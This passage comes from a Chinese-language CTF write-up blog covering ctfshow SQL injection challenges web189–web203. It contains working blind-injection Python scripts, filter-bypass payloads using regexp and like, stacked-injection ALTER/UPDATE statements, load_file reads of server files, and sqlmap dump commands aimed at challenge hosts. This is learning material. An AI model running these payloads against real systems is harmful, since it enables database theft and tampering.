mid + <span class="number">1</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="number">123</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tail = mid</span><br><span class="line">    <span class="keyword">return</span> mid</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getflag</span>(<span class="params">num</span>):</span><br><span class="line">    i = <span class="built_in">int</span>(num)</span><br><span class="line">    result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        i = i + <span class="number">1</span></span><br><span class="line">        head = <span class="number">32</span></span><br><span class="line">        tail = <span class="number">127</span></span><br><span class="line">        <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">            mid = (head + tail) &gt;&gt; <span class="number">1</span></span><br><span class="line">            payload = <span class="string">f&#x27;if(ascii(substr(load_file(&quot;/var/www/html/api/index.php&quot;),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,0,1)&#x27;</span></span><br><span class="line">            data = &#123;<span class="string">&quot;username&quot;</span>: payload, <span class="string">&quot;password&quot;</span>: <span class="number">0</span>&#125;</span><br><span class="line">            r = requests.post(url, data=data)</span><br><span class="line">            <span class="comment"># if &quot;\u5bc6\u7801\u9519\u8bef&quot; in r.text:</span></span><br><span class="line">            <span class="comment">#     head = mid + 1</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;密码错误&quot;</span> ==r.json()[<span class="string">&#x27;msg&#x27;</span>]:</span><br><span class="line">                head = mid + <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                tail = mid</span><br><span class="line">        <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">            result += <span class="built_in">chr</span>(head)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="built_in">print</span>(result)</span><br><span class="line"><span class="comment">#\u67e5\u8be2\u5931\u8d25 查询错误</span></span><br><span class="line"><span class="comment">#\u5bc6\u7801\u9519\u8bef 密码错误</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    m=getflagindex()</span><br><span class="line">    <span class="built_in">print</span>(getflag(m))</span><br></pre></td></tr></table></figure>

<h2 id="反思-10"><a href="#反思-10" class="headerlink" title="反思"></a>反思</h2><p>1.这个题目一开始就没想到去读文件，题目提示<code>flag在api/index.php文件中</code>，没有get到这个意思，后面看了大佬的题解才发现原来是利用<code>select load_file(&#39;/var/www/html/api/index.php&#39;)</code> 去读文件的内容。</p>
<p>2.第二个点其实就是这个判断逻辑里面：</p>
<p><code>if &quot;\u5bc6\u7801\u9519\u8bef&quot; in r.text</code> ，这个是有问题的，应该写成  <code>if &quot;密码错误&quot; == r.json()[&#39;msg&#39;]:</code>这种格式。</p>
<p>3核心语句就两条，剩下的就是套盲注的板子，不过这里注意写法，找flag位置盲注脚本和最后注字符的内容稍微有些不一样:.</p>
<p>3.1找flag位置：<code>username=if(locate(&quot;ctfshow&quot;,load_file(&#39;/var/www/html/api/index.php&#39;))&gt;&#123;&#125;,0,1)&amp;password=1</code></p>
<p>3.2注出flag的内容: <code>username=if(ascii(substr(load_file(&quot;/var/www/html/api/index.php&quot;),&#123;&#125;,1))&gt;&#123;&#125;,0,1)&amp;password=1</code></p>
<p>4.hackbar 发送payload过去的时候，注意编码的问题。</p>
<p>5<code>where username=if(xxxx,0,1)</code>.这种语法肯定是可以的，if函数返回值赋值给username</p>
<h2 id="web190"><a href="#web190" class="headerlink" title="web190"></a>web190</h2><p>盲注的板子，这里没有任何过滤，所以思路可以有很多。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://e2d08e2f-f766-4222-b77f-e7cf2adff845.challenge.ctf.show/api/index.php&quot;</span></span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        mid = (head + tail) &gt;&gt; <span class="number">1</span></span><br><span class="line">        payload1 = <span class="string">f&quot;admin&#x27;and if(ascii(substr((select database()),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,1,0)#&quot;</span> <span class="comment">#注入得出ctfshow_web</span></span><br><span class="line">        payload2 = <span class="string">f&quot;admin&#x27;and if(ascii(substr((select group_concat(table_name)from information_schema.tables where table_schema=database()),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,1,0)#&quot;</span></span><br><span class="line">        payload3=  <span class="string">f&quot;admin&#x27;and if(ascii(substr((select group_concat(column_name)from information_schema.columns where table_name=&#x27;ctfshow_fl0g&#x27;),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,1,0)#&quot;</span></span><br><span class="line">        payload4=  <span class="string">f&quot;admin&#x27;and if(ascii(substr((select group_concat(f1ag) from ctfshow_fl0g ),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,1,0)#&quot;</span></span><br><span class="line">        data=&#123;<span class="string">&quot;username&quot;</span>:payload4,<span class="string">&quot;password&quot;</span>:<span class="number">1</span>&#125;</span><br><span class="line">        r=requests.post(url,data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;密码错误&quot;</span> <span class="keyword">in</span> r.json()[<span class="string">&#x27;msg&#x27;</span>]:</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tail = mid</span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        result += <span class="built_in">chr</span>(head)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure>

<h2 id="web191"><a href="#web191" class="headerlink" title="web191"></a>web191</h2><p>过滤了ascii、file 、into，把web190的脚本的<code>ascii</code>替换成<code>ord</code>即可。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://3b815fb2-5e67-4602-82b0-192049b85e83.challenge.ctf.show/api/index.php&quot;</span></span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        mid = (head + tail) &gt;&gt; <span class="number">1</span></span><br><span class="line">        payload1 = <span class="string">f&quot;admin&#x27;and if(ord(substr((select database()),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,1,0)#&quot;</span> <span class="comment">#注入得出ctfshow_web</span></span><br><span class="line">        payload2 = <span class="string">f&quot;admin&#x27;and if(ord(substr((select group_concat(table_name)from information_schema.tables where table_schema=database()),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,1,0)#&quot;</span></span><br><span class="line">        payload3=  <span class="string">f&quot;admin&#x27;and if(ord(substr((select group_concat(column_name)from information_schema.columns where table_name=&#x27;ctfshow_fl0g&#x27;),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,1,0)#&quot;</span></span><br><span class="line">        payload4=  <span class="string">f&quot;admin&#x27;and if(ord(substr((select group_concat(f1ag) from ctfshow_fl0g ),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,1,0)#&quot;</span></span><br><span class="line">        data=&#123;<span class="string">&quot;username&quot;</span>:payload4,<span class="string">&quot;password&quot;</span>:<span class="number">1</span>&#125;</span><br><span class="line">        r=requests.post(url,data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;密码错误&quot;</span> <span class="keyword">in</span> r.json()[<span class="string">&#x27;msg&#x27;</span>]:</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tail = mid</span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        result += <span class="built_in">chr</span>(head)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure>

<h2 id="web192"><a href="#web192" class="headerlink" title="web192"></a>web192</h2><p>在191的基础上ord也过滤了，直接字符串比较也行，但是会出现一些bug。盲注这一块暂时没有啥好的思路，试试双重for循环来爆破：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#web192</span></span><br><span class="line">url=<span class="string">&quot;http://ba2d986e-c147-4325-9683-072970e42d36.challenge.ctf.show/api/index.php&quot;</span></span><br><span class="line">dicts=<span class="string">r&#x27;abcdefghijklmnopqrstuvwxyz-+_&#123;&#125;1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">20</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> dicts:</span><br><span class="line">        payload=<span class="string">&quot;admin&#x27;and if(substr(database(),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;,1,0)#&quot;</span>.<span class="built_in">format</span>(i,j)</span><br><span class="line">        data=&#123;<span class="string">&quot;username&quot;</span>:payload,<span class="string">&quot;password&quot;</span>:<span class="number">1</span>&#125;</span><br><span class="line">        res=requests.post(url,data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;密码错误&quot;</span> == res.json()[<span class="string">&#x27;msg&#x27;</span>]:</span><br><span class="line">            flag+=j</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<p>板子大概就是这样，测试可行。</p>
<h2 id="web193"><a href="#web193" class="headerlink" title="web193"></a>web193</h2><p>过滤的内容:<code>/file|into|ascii|ord|hex|substr/i</code></p>
<p>substr用不了了，那就直接regexp ，或者 like </p>
<p>板子1：<code>admin&#39;and if(((select database()) regexp &#39;^ct&#39;),1,0)#</code></p>
<p>或者直接板子2:<code>admin&#39;and (select database())regexp &quot;^ct&quot;#</code></p>
<p>或者板子3:<code>admin&#39;and(select database())like&#39;&#123;&#125;%&#39;</code></p>
<p>上脚本:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://6b47263d-e911-4ac6-8b3d-8df962d1ebd2.challenge.ctf.show/api/index.php&quot;</span></span><br><span class="line">dicts=<span class="string">r&#x27;abcdefghijklmnopqrstuvwxyz-+_&#123;&#125;1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span></span><br><span class="line">flag=<span class="string">&#x27;ctf&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">20</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> dicts:</span><br><span class="line">        payload=<span class="string">&quot;admin&#x27;and(select database())like&#x27;&#123;&#125;%&#x27;#&quot;</span>.<span class="built_in">format</span>(flag+j)</span><br><span class="line">        <span class="comment">#print(payload)</span></span><br><span class="line">        data=&#123;<span class="string">&quot;username&quot;</span>:payload,<span class="string">&quot;password&quot;</span>:<span class="number">1</span>&#125;</span><br><span class="line">        res=requests.post(url,data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;密码错误&quot;</span> == res.json()[<span class="string">&#x27;msg&#x27;</span>]:</span><br><span class="line">            flag+=j</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<p>经过实际测试发现，用regexp可能会输出<code>+</code>，这里可以把+从字典里面去除，或者用like可以避免一下。</p>
<p><code>+:匹配前面的子表达式一次或多次。例如，&#39;zo+&#39; 能匹配 &quot;zo&quot; 以及 &quot;zoo&quot;，但不能匹配 &quot;z&quot;。+ 等价于 &#123;1,&#125;。</code></p>
<h2 id="web194"><a href="#web194" class="headerlink" title="web194"></a>web194</h2><p>过滤了：<code>/file|into|ascii|ord|hex|substr|char|left|right|substring/i</code>，还是可以用上面的脚本跑：</p>
<h2 id="web195"><a href="#web195" class="headerlink" title="web195"></a>web195</h2><p>题目提示了是堆叠注入，其实考察堆叠注入的时候，大多都是对表、对字段、对值做一些宏观上面的操作。比如更改字段名啊，修改字段的值啊，甚至修改表名之类。然后再结合题目的验证逻辑来达到我们的目的。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">查询语句:</span><br><span class="line"> <span class="variable">$sql</span> = <span class="string">&quot;select pass from ctfshow_user where username = <span class="subst">&#123;$username&#125;</span>;&quot;</span>;</span><br><span class="line">返回逻辑:</span><br><span class="line">  <span class="comment">//密码检测</span></span><br><span class="line">  <span class="keyword">if</span>(!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;密码只能为数字&#x27;</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//密码判断</span></span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$row</span>[<span class="string">&#x27;pass&#x27;</span>]==<span class="variable">$password</span>)&#123;</span><br><span class="line">      <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;登陆成功&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">//<span class="doctag">TODO:</span>感觉少了个啥，奇怪,不会又双叒叕被一血了吧</span></span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\#|\x23|\&#x27;|\&quot;|select|union|or|and|\x26|\x7c|file|into/i&#x27;</span>, <span class="variable">$username</span>))&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;用户名非法&#x27;</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$row</span>[<span class="number">0</span>]==<span class="variable">$password</span>)&#123;</span><br><span class="line">      <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&quot;登陆成功 flag is <span class="subst">$flag</span>&quot;</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>一开始我找到了异或注入的点：</p>
<p>随便一个利用的板子：<code>1^if(database()=0x63,0,1)</code>，但select啥的都被过滤了，可能就是直接从pass里面去盲注。但pass可能对应多行，所以直接<code>1^if(substr(pass,1,1)=0x,0,1)</code>不太行，可能会出现语法错误。异或这里我本地测试，逻辑可能有些问题。</p>
<p>要想去对应到where语句的条件，需要用到and逻辑语句。本地demo测试：</p>
<p><code>select pass from test where username=&#39;admin&#39; and if(substr(pass,1,1)=&#39;a&#39;,0,1)</code>  这种是没问题的。 <code>pass</code>可以对应上前面的admin的值。</p>
<p>这个题目正确的思路是通过堆叠去改掉pass的值，然后再去登录嘛：</p>
<p><code>username=111;update反引号ctfshow_user反引号set反引号pass反引号=111&amp;password=111</code></p>
<p>然后再去传<code>username=0&amp;password=111</code></p>
<p>这里这里的表名和字段要用反引号去包裹，比如<code>ctfshow_user</code>和<code>pass</code>。</p>
<h2 id="web196"><a href="#web196" class="headerlink" title="web196"></a>web196</h2><p>这个题目限制了输入的长度，比较坑的地方就是他给了过滤规则：</p>
<p><code>/ |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\#|\x23|\&#39;|\&quot;|select|union|or|and|\x26|\x7c|file|into/i</code>，<strong>但这个规则部分并未生效。</strong></p>
<p>比如这里的<code>select</code>就还可以用。。所以题目可能有时候就是一个迷惑作用，还得通过实测来判断有无过滤。</p>
<p>payload:<code>?username=-1;select(1);&amp;password=1</code></p>
<h2 id="web197"><a href="#web197" class="headerlink" title="web197"></a>web197</h2><p>我是傻逼！！！一开始卡了很久脚本一直没打通，很奇怪整个逻辑看下来是没问题的，后面问了怀师傅才发现我把判断条件写错了。。</p>
<p>这里判断条件是<strong>登陆成功</strong>，而不是<strong>登录成功</strong>。。。。麻了。。。。</p>
<p>这个题目思路就是把<code>ctfshow_user</code>表的<code>id</code>和<code>pass</code>字段互换一下，然后用<code>username=0x61646d696e</code>(admin的16进制编码)，pass&#x3D;<code>1-100</code> 来遍历。</p>
<p>脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://9d0eca0c-a65f-4f7e-b2b5-98402c419170.challenge.ctf.show/api/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">if</span> i == <span class="number">0</span>:</span><br><span class="line">        data=&#123;<span class="string">&#x27;username&#x27;</span>:<span class="string">&#x27;0;alter table ctfshow_user change column `pass` `ppp` varchar(255);&#x27;</span></span><br><span class="line">              <span class="string">&#x27;alter table ctfshow_user change column `id` `pass` &#x27;</span></span><br><span class="line">              <span class="string">&#x27;varchar(255);alter table ctfshow_user change column `ppp` `id` varchar(255);&#x27;</span></span><br><span class="line">            ,<span class="string">&#x27;password&#x27;</span>:<span class="string">f&#x27;<span class="subst">&#123;i&#125;</span>&#x27;</span>&#125;</span><br><span class="line">        <span class="built_in">print</span>(data)</span><br><span class="line">        r = requests.post(url, data=data)</span><br><span class="line"></span><br><span class="line">    data=&#123;<span class="string">&#x27;username&#x27;</span>:<span class="string">&#x27;0x61646d696e&#x27;</span>,<span class="string">&#x27;password&#x27;</span>:<span class="string">f&#x27;<span class="subst">&#123;i&#125;</span>&#x27;</span>&#125;</span><br><span class="line">    <span class="built_in">print</span>(data)</span><br><span class="line">    r=requests.post(url, data=data)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;登陆成功&quot;</span> <span class="keyword">in</span> r.json()[<span class="string">&#x27;msg&#x27;</span>]:</span><br><span class="line">        <span class="built_in">print</span>(r.json()[<span class="string">&#x27;msg&#x27;</span>])</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="web198"><a href="#web198" class="headerlink" title="web198"></a>web198</h2><p>同197</p>
<h2 id="web199"><a href="#web199" class="headerlink" title="web199"></a>web199</h2><p>上面的方式打不通了，参考了Y4大佬的方式，可以这样：</p>
<p><code>username=0;show tables;&amp;password=ctfshow_user</code> </p>
<p><img src="https://img.picui.cn/free/2024/11/07/672ce060081e8.png" alt="web199_1.png"></p>
<p>而判断逻辑是这样的：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if($row[0]==$password)&#123;</span><br><span class="line">    $ret[&#x27;msg&#x27;]=&quot;登陆成功 flag is $flag&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>所以猜想可能这里row[0]取得是最后一次执行结果的数据。</p>
<h2 id="web200"><a href="#web200" class="headerlink" title="web200"></a>web200</h2><p>同199</p>
<h2 id="web201"><a href="#web201" class="headerlink" title="web201"></a>web201</h2><p>联系sqlmap语法的使用，其实这里有几个地方需要注意下：</p>
<p>一个是传参点：<code>https://c2023add-c3ee-4a05-963e-75c383bb0609.challenge.ctf.show/api/?id=1</code> ，这个是通过抓包来分析看到的一个传参接口。</p>
<p>另外一个就是要带上<code>User-agen</code>t&amp;<code>Referer</code>，并且指定User-agent的值为sqlmap，Referer的值为ctf.show ； 这一处不知道咋来的，题目好像没看到提示。</p>
<p>然后就可以愉快的用sqlmap去梭了，当然你需要一个<code>sqlmap</code></p>
<p>基本命令(get传参)</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">&quot;http://c2023add-c3ee-4a05-963e-75c383bb0609.challenge.ctf.show/api/?id=1&quot;</span> --referer=<span class="string">&quot;ctf.show&quot;</span> --user-agent=<span class="string">&quot;sqlmap&quot;</span>    <span class="comment">#检查漏洞</span></span><br><span class="line"></span><br><span class="line">python sqlmap.py -u <span class="string">&quot;http://c2023add-c3ee-4a05-963e-75c383bb0609.challenge.ctf.show/api/?id=1&quot;</span> --referer=<span class="string">&quot;ctf.show&quot;</span> --user-agent=<span class="string">&quot;sqlmap&quot;</span> --dbs <span class="comment">#爆库</span></span><br><span class="line"></span><br><span class="line">python sqlmap.py -u <span class="string">&quot;http://c2023add-c3ee-4a05-963e-75c383bb0609.challenge.ctf.show/api/?id=1&quot;</span> --referer=<span class="string">&quot;ctf.show&quot;</span> --user-agent=<span class="string">&quot;sqlmap&quot;</span> -D ctfshow_web --tables <span class="comment">#爆ctfshow_web库对应的表</span></span><br><span class="line"></span><br><span class="line">python sqlmap.py -u <span class="string">&quot;http://c2023add-c3ee-4a05-963e-75c383bb0609.challenge.ctf.show/api/?id=1&quot;</span> --referer=<span class="string">&quot;ctf.show&quot;</span> --user-agent=<span class="string">&quot;sqlmap&quot;</span> -D ctfshow_web -T ctfshow_user --columns <span class="comment">#爆ctfshow_user表的字段</span></span><br><span class="line"></span><br><span class="line">python sqlmap.py -u <span class="string">&quot;http://c2023add-c3ee-4a05-963e-75c383bb0609.challenge.ctf.show/api/?id=1&quot;</span> --referer=<span class="string">&quot;ctf.show&quot;</span> --user-agent=<span class="string">&quot;sqlmap&quot;</span> -D ctfshow_web -T ctfshow_user --dump  <span class="comment">#爆ctfshow_user表的值</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="web202"><a href="#web202" class="headerlink" title="web202"></a>web202</h2><p>和上题的区别就是，这里是post传参，注意这里的 –data “id&#x3D;1” ， id要用双引号来包裹，而不是单引号。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">&quot;http://4751c31d-372a-4816-9dfb-3fac542546ba.challenge.ctf.show/api/&quot;</span> --data <span class="string">&quot;id=1&quot;</span> --referer=<span class="string">&quot;ctf.show&quot;</span> --user-agent=<span class="string">&quot;sqlmap&quot;</span>    <span class="comment">#检查漏洞</span></span><br><span class="line"></span><br><span class="line">python sqlmap.py -u <span class="string">&quot;http://4751c31d-372a-4816-9dfb-3fac542546ba.challenge.ctf.show/api/&quot;</span> --data <span class="string">&quot;id=1&quot;</span> --referer=<span class="string">&quot;ctf.show&quot;</span> --user-agent=<span class="string">&quot;sqlmap&quot;</span> --dbs <span class="comment">#爆库</span></span><br><span class="line"></span><br><span class="line">python sqlmap.py -u <span class="string">&quot;http://4751c31d-372a-4816-9dfb-3fac542546ba.challenge.ctf.show/api/&quot;</span> --data <span class="string">&quot;id=1&quot;</span> --referer=<span class="string">&quot;ctf.show&quot;</span> --user-agent=<span class="string">&quot;sqlmap&quot;</span> -D ctfshow_web --tables <span class="comment">#爆ctfshow_web库对应的表</span></span><br><span class="line"></span><br><span class="line">python sqlmap.py -u <span class="string">&quot;http://4751c31d-372a-4816-9dfb-3fac542546ba.challenge.ctf.show/api/&quot;</span> --data <span class="string">&quot;id=1&quot;</span> --referer=<span class="string">&quot;ctf.show&quot;</span> --user-agent=<span class="string">&quot;sqlmap&quot;</span> -D ctfshow_web -T ctfshow_user --columns<span class="comment">#爆ctfshow_user表的字段</span></span><br><span class="line"></span><br><span class="line">python sqlmap.py -u <span class="string">&quot;http://4751c31d-372a-4816-9dfb-3fac542546ba.challenge.ctf.show/api/&quot;</span> --data <span class="string">&quot;id=1&quot;</span> --referer=<span class="string">&quot;ctf.show&quot;</span> --user-agent=<span class="string">&quot;sqlmap&quot;</span> -D ctfshow_web -T ctfshow_user --dump <span class="comment">#爆ctfshow_user表的值</span></span><br></pre></td></tr></table></figure>

<h2 id="web203"><a href="#web203" class="headerlink" title="web203"></a>web203</h2><p>这个题目就是得加上Content-type ，值为 text&#x2F;plain，否则是按照表单去提交的，put接收不到。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">&quot;http://05a2ca42-c007-422e-8452-3dc5bfd87519.challenge.ctf.show/api/index.php&quot;</span> --me</span><br><span class="line">thod=<span class="string">&quot;PUT&quot;</span> --data=<span class="string">&quot;id=1&quot;</span> --user-agent==<span class="string">&quot;sqlmap&quot;</span> --referer=<span class="string">&quot;ctf.show&quot;</span> --headers=<span class="string">&quot;Content-Type: text/plain&quot;</span> --dbs</span><br></pre></td></tr></table></figure>

